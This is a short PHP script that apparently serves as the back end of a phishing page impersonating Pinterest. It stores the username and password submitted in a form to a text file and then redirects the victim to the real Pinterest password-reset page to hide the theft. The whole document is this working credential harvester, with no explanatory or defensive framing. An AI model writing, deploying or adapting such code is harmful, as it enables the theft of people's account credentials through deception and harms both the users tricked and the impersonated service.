<?php
file_put_contents("usernames.txt", "Pinterest Username: " . $_POST['id'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.pinterest.com/password/reset/');
exit();
?>